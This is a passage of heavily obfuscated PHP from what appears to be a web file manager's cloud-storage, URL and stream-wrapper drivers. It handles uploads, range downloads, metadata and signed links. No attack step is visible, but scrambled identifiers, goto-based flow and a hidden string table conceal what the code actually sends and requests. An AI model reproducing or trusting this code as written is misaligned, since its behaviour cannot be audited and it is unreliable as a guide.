$eÇ’Ôøİ±¼[$d¯Ô¥˜¡­[29]] == $d¯Ô¥˜¡­[76]; }); $CÖëï¾¨ñ¾ = count($BŸ„ãÙ¹× ); $FÉ„ÚÖ®» = count($FÉ„ÚÖ®»); $d„²ÃğØ¿ã = $CÖëï¾¨ñ¾ - $FÉ„ÚÖ®»; if ($bÁÃÔ™÷®•) { $E…ßÅ×—Ø… += $FÉ„ÚÖ®»; $BÍÇøÍ¶Ü­ += $d„²ÃğØ¿ã; if ($CÖëï¾¨ñ¾ < $fØ ÔÉ§Áª) { break; } continue; } if ($B®ÏŠ©²‡‘) { if ($d„²ÃğØ¿ã) { return !0; } } else { if ($FÉ„ÚÖ®») { return !0; } } if ($CÖëï¾¨ñ¾ < $fØ ÔÉ§Áª) { break; } } if ($bÁÃÔ™÷®•) { return array($fãÍƒ¯õĞŠ[201] => $BÍÇøÍ¶Ü­, $fãÍƒ¯õĞŠ[202] => $E…ßÅ×—Ø…); } return !1; goto FíÀãº ›Ç; eÛƒÜ»²íŞ: $BÍÇøÍ¶Ü­ = 0; $E…ßÅ×—Ø… = 0; $F¦µ´ïá™ = rtrim($E…‚èëŒ¯Š, $fãÍƒ¯õĞŠ[8]) . $fãÍƒ¯õĞŠ[8]; goto dºñß±äÙ±; E…Ë•÷Ã§: $fãÍƒ¯õĞŠ =& $_SERVER[ç]; $fÄ×…òÔŒË = $fãÍƒ¯õĞŠ[33]; $fØ ÔÉ§Áª = 500; goto eÛƒÜ»²íŞ; FíÀãº ›Ç: } public function listAll($b‚¶øÇ¦ê«) { goto bò‰ä®¨Ê‘; CŸˆÈîê¦„: return $this->listAllFiles($b‚¶øÇ¦ê«, array_keys($FØ“â‚ê¾), $FØ“â‚ê¾); goto A›­ùŸƒ¬¢; bò‰ä®¨Ê‘: $EÙÌËó³š =& $_SERVER[ç]; $b¸áËõù–¼ = $f–ÕîùŒÀÒ = array(); $this->fileList($b‚¶øÇ¦ê«, $b¸áËõù–¼, $f–ÕîùŒÀÒ, !0); goto CÆ´èæÔ³¯; CÆ´èæÔ³¯: $FØ“â‚ê¾ = array(); foreach ($f–ÕîùŒÀÒ as $eÕ·è«—Š) { $FØ“â‚ê¾[$eÕ·è«—Š[$EÙÌËó³š[28]]] = $eÕ·è«—Š[$EÙÌËó³š[77]]; } foreach ($b¸áËõù–¼ as $eÕ·è«—Š) { if (is_string($eÕ·è«—Š)) { $FØ“â‚ê¾[$eÕ·è«—Š] = 0; } } goto CŸˆÈîê¦„; A›­ùŸƒ¬¢: } public function canRead($DªÑÍÕÊº‰) { return $this->exist($DªÑÍÕÊº‰) ? !0 : !1; } public function canWrite($a¡ƒ–¸»Ä™) { return $this->exist($a¡ƒ–¸»Ä™) ? !0 : !1; } public function getContent($C¢´‘½ãŒÅ) { return $this->fileSubstr($C¢´‘½ãŒÅ, 0, -1); } public function setContent($C–ïƒ‰Â™Ş, $a±Â­´„É’ = '') { $D˜ò÷•®ä =& $_SERVER[ç]; if (!$a±Â­´„É’) { $b£Şİ®Æè” = $this->ussRequest($C–ïƒ‰Â™Ş, $D˜ò÷•®ä[222]); return $b£Şİ®Æè”[$D˜ò÷•®ä[1053]]; } $e‡’¬ÛÍÇÆ = $this->tempFile($this->pathThis($C–ïƒ‰Â™Ş)); file_put_contents($e‡’¬ÛÍÇÆ, $a±Â­´„É’); if ($this->upload($C–ïƒ‰Â™Ş, $e‡’¬ÛÍÇÆ)) { $this->tempFileRemve($e‡’¬ÛÍÇÆ); return !0; } return !1; } public function fileSubstr($BÖÌğÏ­‹, $fç»¬¶Áâ†, $BŸŞ¤µ»¾Û) { $dÖ½˜Ğç¤Š =& $_SERVER[ç]; if (!($FØ–†Êî˜ = $this->link($BÖÌğÏ­‹))) { return !1; } $CŸ¡ÃÑµÚ = !1; if ($BŸŞ¤µ»¾Û > 0) { $e¨º‹‹èğà = $fç»¬¶Áâ† + $BŸŞ¤µ»¾Û - 1; $CŸ¡ÃÑµÚ = array($dÖ½˜Ğç¤Š[1273] . $fç»¬¶Áâ† . $dÖ½˜Ğç¤Š[434] . $e¨º‹‹èğà); } $eöÉĞÑ›±‰ = url_request($FØ–†Êî˜, $dÖ½˜Ğç¤Š[226], !1, $CŸ¡ÃÑµÚ); return $eöÉĞÑ›±‰[$dÖ½˜Ğç¤Š[695]] ? $eöÉĞÑ›±‰[$dÖ½˜Ğç¤Š[1055]] : !1; } public function upload($B™·Ô½…, $eÖƒÃÅù™œ, $aŸ›»ò½°º = false, $DïÇìã¶Éõ = REPEAT_REPLACE) { goto D»©Ö¤; EÎá°Ï¹½Š: do { $BêÊ’Ô = $E›¤÷…øÙ[$fÅ×ºâÛÌ[1319]]; fseek_64($D¡…ˆ‹°¥÷, $dŠ…®¨ï™‘); $CÙ½¶®ù‰â = fread($D¡…ˆ‹°¥÷, $BêÊ’Ô); $cé¹ ììå = 0; do { $cé¹ ììå++; $E›¤÷…øÙ = $this->uploadPart($B™·Ô½…, $E›¤÷…øÙ, $CÙ½¶®ù‰â); } while (!$E›¤÷…øÙ && $cé¹ ììå < 3); if (!$E›¤÷…øÙ) { return !1; } $c»ì£­  Ú = $E›¤÷…øÙ[$fÅ×ºâÛÌ[1318]]; $dŠ…®¨ï™‘ += $BêÊ’Ô; } while ($c»ì£­  Ú != -1); fclose($D¡…ˆ‹°¥÷); $c‘Î›Ò¬Èî = array($fÅ×ºâÛÌ[1320], $fÅ×ºâÛÌ[1321] . $E›¤÷…øÙ[$fÅ×ºâÛÌ[1322]], $fÅ×ºâÛÌ[1316]); goto CÖÜÁ¹¤®˜; Dí¬£×ã©: if (!$d¤œÂ‰ø˜´[$fÅ×ºâÛÌ[1053]]) { return !1; } $E›¤÷…øÙ = $d¤œÂ‰ø˜´[$fÅ×ºâÛÌ[1055]]; $dŠ…®¨ï™‘ = 0; goto a„½¼·„; a„½¼·„: $c»ì£­  Ú = $E›¤÷…øÙ[$fÅ×ºâÛÌ[1318]]; $D¡…ˆ‹°¥÷ = fopen($eÖƒÃÅù™œ, $fÅ×ºâÛÌ[1223]); if (!$D¡…ˆ‹°¥÷) { return !1; } goto EÎá°Ï¹½Š; B„šš©¿®: $FÈ×©í’â– = 1024 * 1024 * 10; $c‘Î›Ò¬Èî = array($fÅ×ºâÛÌ[1314], $fÅ×ºâÛÌ[1315] . $EøÄŒñª§Ö, $fÅ×ºâÛÌ[1316], $fÅ×ºâÛÌ[1317] . $FÈ×©í’â–); $d¤œÂ‰ø˜´ = $this->ussRequest($B™·Ô½…, $fÅ×ºâÛÌ[224], !1, $c‘Î›Ò¬Èî); goto Dí¬£×ã©; CÖÜÁ¹¤®˜: $d¤œÂ‰ø˜´ = $this->ussRequest($B™·Ô½…, $fÅ×ºâÛÌ[224], !1, $c‘Î›Ò¬Èî); return $d¤œÂ‰ø˜´[$fÅ×ºâÛÌ[1053]] ? $this->getPathOuter($EˆôŠéÕ©“) : !1; goto e”ÃÜÇñƒé; D»©Ö¤: $fÅ×ºâÛÌ =& $_SERVER[ç]; $EøÄŒñª§Ö = IO::size($eÖƒÃÅù™œ); if ($EøÄŒñª§Ö <= 1024 * 1024 * 200) { $eĞ’»÷„äÎ = array($fÅ×ºâÛÌ[1313] . $eÖƒÃÅù™œ); $d¤œÂ‰ø˜´ = $this->ussRequest($B™·Ô½…, $fÅ×ºâÛÌ[224], $eĞ’»÷„äÎ); return $d¤œÂ‰ø˜´[$fÅ×ºâÛÌ[1053]] ? $this->getPathOuter($B™·Ô½…) : !1; } goto B„šš©¿®; e”ÃÜÇñƒé: } private function uploadPart($bÍËÂ ñºµ, $B¶éˆÄ÷Õ, &$CÔï ÛùÅµ) { $F“”÷ô¶« =& $_SERVER[ç]; $eÊÌ¥ö¶‰ä = array($F“”÷ô¶«[1323], $F“”÷ô¶«[1321] . $B¶éˆÄ÷Õ[$F“”÷ô¶«[1322]], $F“”÷ô¶«[1324] . $B¶éˆÄ÷Õ[$F“”÷ô¶«[1318]], $F“”÷ô¶«[140] . $B¶éˆÄ÷Õ[$F“”÷ô¶«[1319]]); $dá´ĞˆñÀ… = $this->ussRequest($bÍËÂ ñºµ, $F“”÷ô¶«[224], $CÔï ÛùÅµ, $eÊÌ¥ö¶‰ä); return !$dá´ĞˆñÀ…[$F“”÷ô¶«[1053]] ? $dá´ĞˆñÀ…[$F“”÷ô¶«[1053]] : $dá´ĞˆñÀ…[$F“”÷ô¶«[1055]]; } public function uploadFormData($dÄÇĞŠÓùè, $DóÈ¤í²Ëˆ = 3600) { return $this->uploadPolicy($dÄÇĞŠÓùè, $DóÈ¤í²Ëˆ); } public function multiUploadFormData($C¢¨ĞŞ’–, $D¯‡ÙÙå˜› = 3600) { $dĞ«èñ„Š =& $_SERVER[ç]; $bŠ§¯…›à« = (int) $GLOBALS[$dĞ«èñ„Š[7]][$dĞ«èñ„Š[77]]; return $this->uploadPolicy($C¢¨ĞŞ’–, $D¯‡ÙÙå˜›, $bŠ§¯…›à«); } private function uploadPolicy($d³òÂ‘øÒ˜, $B¡‘Í«Ç´… = 3600, $FÄŒÚ°Í”µ = 0) { goto eÍ±ÇêéÄ; eÍ±ÇêéÄ: $cÀ´÷¡»ñ =& $_SERVER[ç]; $CÒ¬Ùê…Í¥ = $cÀ´÷¡»ñ[8] . $this->bucket; $FãùÓ‹ã›ğ = gmdate($cÀ´÷¡»ñ[1260]); goto aÏ™“ÎºÛÎ; aÏ™“ÎºÛÎ: $bºµŸë²’ã = array($cÀ´÷¡»ñ[1325] => $this->bucket, $cÀ´÷¡»ñ[1326] => $d³òÂ‘øÒ˜, $cÀ´÷¡»ñ[1327] => time() + $B¡‘Í«Ç´…, $cÀ´÷¡»ñ[1328] => $FãùÓ‹ã›ğ); if ($FÄŒÚ°Í”µ) { $bºµŸë²’ã[$cÀ´÷¡»ñ[1239]] = $FÄŒÚ°Í”µ; } $d¯‰ãÔ†† = base64_encode(json_encode($bºµŸë²’ã)); goto Dé¢‹®íš; Dé¢‹®íš: $dô“îáâ©¨ = base64_encode(hash_hmac($cÀ´÷¡»ñ[1295], "\x50\x4f\123\124\x26{$CÒ¬Ùê…Í¥}\x26{$FãùÓ‹ã›ğ}\46{$d¯‰ãÔ††}", md5("{$this->userpass}"), !0)); $D—÷ˆÇÈë = array($cÀ´÷¡»ñ[1166] => $d¯‰ãÔ††, $cÀ´÷¡»ñ[1329] => "\125\120\x59\125\x4e\x20{$this->username}\x3a{$dô“îáâ©¨}", $cÀ´÷¡»ñ[175] => $this->endpoint . $CÒ¬Ùê…Í¥); return $D—÷ˆÇÈë; goto Cñ£·˜÷©; Cñ£·˜÷©: } public function download($a´“Ô’ÑÎ¥, $CŠ’¦Ù›òé) { goto c‹­”¯Œ»‰; dÂóãÈ‹ë: $CåíÛÜ¾÷† = 1024 * 200; $A„¶¾ã½…Ê = fopen($Bùëİ–, $_SERVER[ç][1279]); while (!0) { $F¢Ğ˜ëèî¼ = $this->fileSubstr($a´“Ô’ÑÎ¥, $a˜£È±· , $CåíÛÜ¾÷†); if ($F¢Ğ˜ëèî¼ === !1) { return !1; } fwrite($A„¶¾ã½…Ê, $F¢Ğ˜ëèî¼); $a˜£È±·  += $CåíÛÜ¾÷†; if (strlen($F¢Ğ˜ëèî¼) < $CåíÛÜ¾÷†) { break; } } goto EˆÃİ®„á–; c‹­”¯Œ»‰: $Bùëİ– = IO::getPathInner(IO::mkfile($CŠ’¦Ù›òé)); if (!($aŞÁÊÉ’é‡ = $this->link($a´“Ô’ÑÎ¥))) { return !1; } $a˜£È±·  = 0; goto dÂóãÈ‹ë; EˆÃİ®„á–: fclose($A„¶¾ã½…Ê); return $CŠ’¦Ù›òé; goto dÈ¤Àé„å¨; dÈ¤Àé„å¨: } public function link($fÇâãÛ”éÎ, $fŒš‘‚½ÆÙ = array()) { $bÂ¥˜§÷Ú† =& $_SERVER[ç]; $fÇâãÛ”éÎ = trim($fÇâãÛ”éÎ, $bÂ¥˜§÷Ú†[8]); if (!empty($this->token)) { $d×ôÖĞë“è = strtotime(date($bÂ¥˜§÷Ú†[1330])); $bÊ¬š¹Ÿâè = substr(md5($this->token . $bÂ¥˜§÷Ú†[280] . $d×ôÖĞë“è . $bÂ¥˜§÷Ú†[1331] . $fÇâãÛ”éÎ), 12, 8) . $d×ôÖĞë“è; $fŒš‘‚½ÆÙ[] = $bÂ¥˜§÷Ú†[1332] . $bÊ¬š¹Ÿâè; } $cÎË«··ÎÑ = !empty($fŒš‘‚½ÆÙ) ? $bÂ¥˜§÷Ú†[69] . implode($bÂ¥˜§÷Ú†[280], $fŒš‘‚½ÆÙ) : $bÂ¥˜§÷Ú†[33]; return $this->getHost() . $bÂ¥˜§÷Ú†[8] . $fÇâãÛ”éÎ . $cÎË«··ÎÑ; } public function fileOut($f†éÜ“Úİ, $Dèô‚ô÷³ = false, $F†ÑÎÅ™‰½ = false, $f®ñò³ÚÌŞ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($f†éÜ“Úİ, $Dèô‚ô÷³, $F†ÑÎÅ™‰½, $f®ñò³ÚÌŞ); } if (!$F†ÑÎÅ™‰½) { $F†ÑÎÅ™‰½ = $this->pathThis($f†éÜ“Úİ); } $e¤ãÎòé§ä = $Dèô‚ô÷³ ? array($_SERVER[ç][1333] . rawurlencode($F†ÑÎÅ™‰½)) : array(); $BãÂ¸®İ¿ƒ = $this->link($f†éÜ“Úİ, $e¤ãÎòé§ä); $this->fileOutLink($BãÂ¸®İ¿ƒ); } public function fileOutServer($D§ë¯×–¡, $FÕñ¹çŒŠñ = false, $bÎ´Ö¯¾ğ = false, $C¶Ì¦“™ëİ = '') { parent::fileOut($D§ë¯×–¡, $FÕñ¹çŒŠñ, $bÎ´Ö¯¾ğ, $C¶Ì¦“™ëİ); } public function fileOutImage($CõÃïí³×, $c³¢³İŞ‰Û = 250) { $aÚ¥¨ç¿Éä = $this->link($CõÃïí³× . $_SERVER[ç][1334] . $c³¢³İŞ‰Û); $this->fileOutLink($aÚ¥¨ç¿Éä); } public function fileOutImageServer($d–©Ø…”À², $d°õØßåá = 250) { parent::fileOutImage($d–©Ø…”À², $d°õØßåá); } public function hashMd5($A¥Ÿ“é§áÉ) { $dğ¢·å¬ôç =& $_SERVER[ç]; $c†š¯”­òÈ = $this->_objectMeta($A¥Ÿ“é§áÉ); return isset($c†š¯”­òÈ[$dğ¢·å¬ôç[206]]) ? $c†š¯”­òÈ[$dğ¢·å¬ôç[206]] : !1; } public function size($DÂ¨Üö¡ãÍ) { $f«ÕãÍ“É = $this->objectMeta($DÂ¨Üö¡ãÍ); return $f«ÕãÍ“É ? $f«ÕãÍ“É[$_SERVER[ç][77]] : 0; } public function info($CÖ»Ù“ÍÆ¢) { if ($this->isFolder($CÖ»Ù“ÍÆ¢)) { return $this->folderInfo($CÖ»Ù“ÍÆ¢); } else { if ($this->isFile($CÖ»Ù“ÍÆ¢)) { return $this->fileInfo($CÖ»Ù“ÍÆ¢); } } return !1; } public function exist($Bß·—É¥ ) { return $this->isFile($Bß·—É¥ ) || $this->isFolder($Bß·—É¥ ); } public function isFile($B‚Ä½Ãàƒ) { return !$this->isFolder($B‚Ä½Ãàƒ) && $this->objectMeta($B‚Ä½Ãàƒ); } public function isFolder($D¼ÒÁÊƒÁØ) { return $this->cacheMethod($_SERVER[ç][197], $D¼ÒÁÊƒÁØ); } protected function objectMeta($CÓ’í©¬Ï´) { return $this->cacheMethod($_SERVER[ç][198], $CÓ’í©¬Ï´); } protected function _objectMeta($B»“•Èéìˆ) { goto a‰¦«‰Ëµ…; Cßââñ¿: if (!$a¥ƒ±Ô¶Íâ[$eŒ»³ÌœÙ¯[1053]]) { return null; } $FåÌñ¿Í¡¼ = isset($a¥ƒ±Ô¶Íâ[$eŒ»³ÌœÙ¯[1055]]) ? $a¥ƒ±Ô¶Íâ[$eŒ»³ÌœÙ¯[1055]] : array(); if (!isset($FåÌñ¿Í¡¼[$eŒ»³ÌœÙ¯[1336]])) { return null; } goto Fæ½¡æÃ¦—; Fæ½¡æÃ¦—: $dšªĞ˜‘àë = array($eŒ»³ÌœÙ¯[29] => isset($FåÌñ¿Í¡¼[$eŒ»³ÌœÙ¯[1336]]) ? $FåÌñ¿Í¡¼[$eŒ»³ÌœÙ¯[1336]] : null, $eŒ»³ÌœÙ¯[77] => isset($FåÌñ¿Í¡¼[$eŒ»³ÌœÙ¯[1337]]) ? $FåÌñ¿Í¡¼[$eŒ»³ÌœÙ¯[1337]] : null, $eŒ»³ÌœÙ¯[206] => isset($FåÌñ¿Í¡¼[$eŒ»³ÌœÙ¯[1338]]) ? $FåÌñ¿Í¡¼[$eŒ»³ÌœÙ¯[1338]] : null, $eŒ»³ÌœÙ¯[1305] => isset($FåÌñ¿Í¡¼[$eŒ»³ÌœÙ¯[1339]]) ? $FåÌñ¿Í¡¼[$eŒ»³ÌœÙ¯[1339]] : null); $dšªĞ˜‘àë[$eŒ»³ÌœÙ¯[1306]] = isset($FåÌñ¿Í¡¼[$eŒ»³ÌœÙ¯[1340]]) ? strtotime($FåÌñ¿Í¡¼[$eŒ»³ÌœÙ¯[1340]]) : $dšªĞ˜‘àë[$eŒ»³ÌœÙ¯[1305]]; return $dšªĞ˜‘àë; goto eë“£•¿å; a‰¦«‰Ëµ…: $eŒ»³ÌœÙ¯ =& $_SERVER[ç]; if ($B»“•Èéìˆ == $eŒ»³ÌœÙ¯[33] || $B»“•Èéìˆ == $eŒ»³ÌœÙ¯[8]) { return array(); } $a¥ƒ±Ô¶Íâ = $this->ussRequest($B»“•Èéìˆ, $eŒ»³ÌœÙ¯[1335]); goto Cßââñ¿; eë“£•¿å: } protected function _isFolder($aÛ”¶ï…Õ) { $B‰çãÛİ´ =& $_SERVER[ç]; if ($aÛ”¶ï…Õ == $B‰çãÛİ´[33] || $aÛ”¶ï…Õ == $B‰çãÛİ´[8]) { return !0; } $C¥¶Æ¥–™İ = $this->_objectMeta($aÛ”¶ï…Õ); return isset($C¥¶Æ¥–™İ[$B‰çãÛİ´[29]]) && $C¥¶Æ¥–™İ[$B‰çãÛİ´[29]] == $B‰çãÛİ´[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($eÊñô¾Ûß¨ = false) { } public function exist($eŸÆ ‹ÂÑ) { $Aì¥ÁàñÇ³ = $this->info($eŸÆ ‹ÂÑ); return $Aì¥ÁàñÇ³[$_SERVER[ç][193]]; } public function isFile($b‰è™Á¨Ò¢) { $açÌ¦‰—é˜ = $this->info($b‰è™Á¨Ò¢); return $açÌ¦‰—é˜[$_SERVER[ç][193]]; } public function isFolder($dƒã¨Äš¬É) { return !1; } public function size($e Ç‰›ùÂ’) { $b¬ŒÈğ¨Ê« = $this->info($e Ç‰›ùÂ’); return $b¬ŒÈğ¨Ê«[$_SERVER[ç][77]]; } public function info($B§À„åĞ„) { return $this->infoParse($B§À„åĞ„); } public function infoAuth($f‡ğŸ‘¦—) { return $this->infoParse($f‡ğŸ‘¦—); } public function infoWithChildren($cÔÄŸÖ¥Ë) { return $this->infoParse($cÔÄŸÖ¥Ë); } public function infoFull($DÔèæÄÀ×ƒ) { return $this->infoParse($DÔèæÄÀ×ƒ); } private function infoParse($C§Õ‰ãÚè¨) { $A‡Ùµ´¶ÀË =& $_SERVER[ç]; $B³è‘‡·…­ = $this->header($C§Õ‰ãÚè¨); if (!$B³è‘‡·…­ || !$B³è‘‡·…­[$A‡Ùµ´¶ÀË[695]]) { return !1; } $aÑõèÕœ˜² = _get($B³è‘‡·…­, $A‡Ùµ´¶ÀË[333], 0); $f˜‹«¨§ßê = array($A‡Ùµ´¶ÀË[28] => $B³è‘‡·…­[$A‡Ùµ´¶ÀË[28]], $A‡Ùµ´¶ÀË[75] => $C§Õ‰ãÚè¨, $A‡Ùµ´¶ÀË[29] => $A‡Ùµ´¶ÀË[173], $A‡Ùµ´¶ÀË[77] => intval($aÑõèÕœ˜²), $A‡Ùµ´¶ÀË[167] => get_path_ext($B³è‘‡·…­[$A‡Ùµ´¶ÀË[28]]), $A‡Ùµ´¶ÀË[1220] => $aÑõèÕœ˜² > 0 && $B³è‘‡·…­[$A‡Ùµ´¶ÀË[1341]], $A‡Ùµ´¶ÀË[1221] => !1); return $f˜‹«¨§ßê; } private function header($FÁèï¾ñ®â) { goto a³×Ìİá¡; E¤²¶ñæ×ï: return self::$_cacheHeader[$FÁèï¾ñ®â]; goto Aºò¬¥»ã; b‡¹àãÌò‚: $GLOBALS[$dá÷§»ï„À[1342]] = !0; self::$_cacheHeader[$FÁèï¾ñ®â] = url_header($FÁèï¾ñ®â); $GLOBALS[$dá÷§»ï„À[1342]] = $eÎŒ¶°‚•; goto E¤²¶ñæ×ï; a³×Ìİá¡: $dá÷§»ï„À =& $_SERVER[ç]; if (isset(self::$_cacheHeader[$FÁèï¾ñ®â])) { return self::$_cacheHeader[$FÁèï¾ñ®â]; } $eÎŒ¶°‚• = isset($GLOBALS[$dá÷§»ï„À[1342]]) ? $GLOBALS[$dá÷§»ï„À[1342]] : !1; goto b‡¹àãÌò‚; Aºò¬¥»ã: } public function hashSimple($d§Ô¤àœ¬î, $e¥¼°–º† = false) { goto d©¼ª’Ç”Ç; a©òŠ˜¾Ú: $aÓ¸§ŸØƒÚ .= $this->fileSubstr($d§Ô¤àœ¬î, $CÁ¾ÓŞÂ·¤ - $cÒ¿Ÿ¦¾Åå, $cÒ¿Ÿ¦¾Åå); return md5($aÓ¸§ŸØƒÚ) . $CÁ¾ÓŞÂ·¤; goto F‚ëå¦†›ô; B²Å¥¡½«Í: $D‚çĞÄ¥Ë‘ = timeFloat(); $b÷¨–¸‰ó = 15; for ($dœ‚¥ ³Í = 0; $dœ‚¥ ³Í < $A¸‘•¿œ‚; $dœ‚¥ ³Í++) { if (timeFloat() - $D‚çĞÄ¥Ë‘ > $b÷¨–¸‰ó) { return !1; } $A’³Í¬´ = $this->fileSubstr($d§Ô¤àœ¬î, $eéˆ¨•²˜˜ * $dœ‚¥ ³Í, $cÒ¿Ÿ¦¾Åå); if (!$A’³Í¬´) { return !1; } $aÓ¸§ŸØƒÚ .= $A’³Í¬´; } goto a©òŠ˜¾Ú; dÜ„ç­³½¯: if ($CÁ¾ÓŞÂ·¤ <= $cÒ¿Ÿ¦¾Åå * $A¸‘•¿œ‚) { return md5($this->fileSubstr($d§Ô¤àœ¬î, 0, $CÁ¾ÓŞÂ·¤)) . $CÁ¾ÓŞÂ·¤; } $eéˆ¨•²˜˜ = intval($CÁ¾ÓŞÂ·¤ / $A¸‘•¿œ‚); $aÓ¸§ŸØƒÚ = $DÄ•ë©ëÄ§[33]; goto B²Å¥¡½«Í; d©¼ª’Ç”Ç: $DÄ•ë©ëÄ§ =& $_SERVER[ç]; $BŒº¡Õ’ì‘ = $this->info($d§Ô¤àœ¬î); if (!$BŒº¡Õ’ì‘ || !$BŒº¡Õ’ì‘[$DÄ•ë©ëÄ§[193]]) { return !1; } goto d‹°‡á‘ßš; d‹°‡á‘ßš: $CÁ¾ÓŞÂ·¤ = $BŒº¡Õ’ì‘[$DÄ•ë©ëÄ§[77]]; $cÒ¿Ÿ¦¾Åå = 200; $A¸‘•¿œ‚ = 50; goto dÜ„ç­³½¯; F‚ëå¦†›ô: } public function getContent($Dîù’”‹à) { return $this->fileSubstr($Dîù’”‹à); } public function fileSubstr($Eğ°Ã»¿™ğ, $b…Ø‹Âçª¦ = 0, $FÑÎ¦Ç¿œ = -1) { goto FğƒÕĞÃÍ; b±“™¼é‘æ: if ($FÑÎ¦Ç¿œ === -1) { $FÑÎ¦Ç¿œ = $Eª×ÒõÆ…[$eÈ®×®’ß[77]]; } if ($FÑÎ¦Ç¿œ == 0) { return $eÈ®×®’ß[33]; } $e”»„²â„ = array($eÈ®×®’ß[1343] . $b…Ø‹Âçª¦ . $eÈ®×®’ß[721] . ($b…Ø‹Âçª¦ + $FÑÎ¦Ç¿œ - 1)); goto F”†ÍÌÏÒË; F”†ÍÌÏÒË: $DôÜ¤Äº­Ÿ = url_request($Eğ°Ã»¿™ğ, $eÈ®×®’ß[226], !1, $e”»„²â„, !1, !1, 1); return $DôÜ¤Äº­Ÿ[$eÈ®×®’ß[1055]] ? $DôÜ¤Äº­Ÿ[$eÈ®×®’ß[1055]] : $eÈ®×®’ß[33]; goto cïšƒ£´‚ì; FğƒÕĞÃÍ: $eÈ®×®’ß =& $_SERVER[ç]; $Eª×ÒõÆ… = $this->info($Eğ°Ã»¿™ğ); if (!$Eª×ÒõÆ… || !$Eª×ÒõÆ…[$eÈ®×®’ß[193]] && $Eª×ÒõÆ…[$eÈ®×®’ß[77]] > 1024 * 1024 * 10) { return !1; } goto b±“™¼é‘æ; cïšƒ£´‚ì: } public function download($b¶ŒÛ½Œ°, $CÇÀÊçŠí) { Downloader::start($b¶ŒÛ½Œ°, $CÇÀÊçŠí); return $CÇÀÊçŠí; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($D®‹š­‘ëâ, $fÖãã‰å…™ = '') { goto F–¶‹·—Ÿ; F–¶‹·—Ÿ: $this->info = $this->info($D®‹š­‘ëâ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ç][75]]; goto cÕçÉÒÏĞ¤; Bã‡¹‘ÇôÛ: if (!isset(self::$_chunkBuffer[$D®‹š­‘ëâ])) { self::$_chunkBuffer[$D®‹š­‘ëâ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto Cñá‰ôˆÈ; cÕçÉÒÏĞ¤: $this->pathOpen = $D®‹š­‘ëâ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto Bã‡¹‘ÇôÛ; Cñá‰ôˆÈ: } function stream_read($a¥«›·…¯é) { $F³ÒöÃğƒÖ = $this->fileSubstr($this->pose, $a¥«›·…¯é); $this->pose += strlen($F³ÒöÃğƒÖ); return $F³ÒöÃğƒÖ; } public function stream_tell() { return $this->pose; } public function stream_seek($bˆß”Ì¾çì, $aœÄå¥Ÿ¼) { $Fê¿†©áÀ´ =& $_SERVER[ç]; if ($aœÄå¥Ÿ¼ == SEEK_SET) { $this->pose = $bˆß”Ì¾çì; } else { if ($aœÄå¥Ÿ¼ == SEEK_CUR) { $this->pose += $bˆß”Ì¾çì; } else { if ($aœÄå¥Ÿ¼ == SEEK_END) { $this->pose = $this->info[$Fê¿†©áÀ´[77]] + intval($bˆß”Ì¾çì); } } } if ($bˆß”Ì¾çì < 0) { $this->pose = $this->info[$Fê¿†©áÀ´[77]] + $bˆß”Ì¾çì; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ç][77]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($aæôœ³ÍĞ›, $e…Ö‚Î„ˆ¹) { $eæ«ËÓ±½ =& $_SERVER[ç]; $F…æã™ˆ = $this->info($aæôœ³ÍĞ›); return array($eæ«ËÓ±½[1344] => 0, $eæ«ËÓ±½[1345] => 0, $eæ«ËÓ±½[12] => 32768 + 511, $eæ«ËÓ±½[1346] => 0, $eæ«ËÓ±½[1347] => 0, $eæ«ËÓ±½[1348] => 0, $eæ«ËÓ±½[1349] => 0, $eæ«ËÓ±½[77] => $F…æã™ˆ[$eæ«ËÓ±½[77]], $eæ«ËÓ±½[1350] => $F…æã™ˆ[$eæ«ËÓ±½[1219]], $eæ«ËÓ±½[1306] => $F…æã™ˆ[$eæ«ËÓ±½[83]], $eæ«ËÓ±½[1305] => $F…æã™ˆ[$eæ«ËÓ±½[192]], $eæ«ËÓ±½[1351] => 0, $eæ«ËÓ±½[1352] => 0); } static $fileInfo = array(); public function info($EèÂ ï»©‰) { $dİ¸×—¶Ô¨ = $_SERVER[ç][1353]; if (isset(self::$fileInfo[$EèÂ ï»©‰])) { return self::$fileInfo[$EèÂ ï»©‰]; } if (substr($EèÂ ï»©‰, 0, strlen($dİ¸×—¶Ô¨)) != $dİ¸×—¶Ô¨) { return !1; } self::$fileInfo[$EèÂ ï»©‰] = IO::info(substr($EèÂ ï»©‰, strlen($dİ¸×—¶Ô¨))); return self::$fileInfo[$EèÂ ï»©‰]; } public static function read($a”¡ËÛ‡É·, $fáŠÈÀÕ™ª, $E£¦²¯ÔÒ) { if (!isset(self::$_fopenCache[$a”¡ËÛ‡É·])) { $c¼®µŸËæ† = new StreamWrapperIO(); $c¼®µŸËæ†->stream_open($a”¡ËÛ‡É·); self::$_fopenCache[$a”¡ËÛ‡É·] = $c¼®µŸËæ†; } $c¼®µŸËæ† = self::$_fopenCache[$a”¡ËÛ‡É·]; return $c¼®µŸËæ†->fileSubstr($fáŠÈÀÕ™ª, $E£¦²¯ÔÒ); } public static function _read($AŒ‰éŒ—¢î, $B‚ŠÈ¯™À, $B—Ğ„÷ï¾‡) { goto F÷¦„İÌÁŸ; F÷¦„İÌÁŸ: $C›Åß¬İŸ =& $_SERVER[ç]; $aÈœ’‡´í = fopen($AŒ‰éŒ—¢î, $C›Åß¬İŸ[1223]); if (!$aÈœ’‡´í) { return $C›Åß¬İŸ[33]; } goto F£§ãŞ’Œª; F£§ãŞ’Œª: $bŸ„Ğ·“òâ = 8192; fseek($aÈœ’‡´í, $B‚ŠÈ¯™À, SEEK_SET); $A§öÒ°ˆó’ = $C›Åß¬İŸ[33]; goto E½Âİæº¶×; E½Âİæº¶×: $då”¸†ìŒ = 0; while ($då”¸†ìŒ < $B—Ğ„÷ï¾‡) { $AÒÒ‰óÅ¨Î = min($bŸ„Ğ·“òâ, $B—Ğ„÷ï¾‡ - $då”¸†ìŒ); $A§öÒ°ˆó’ .= 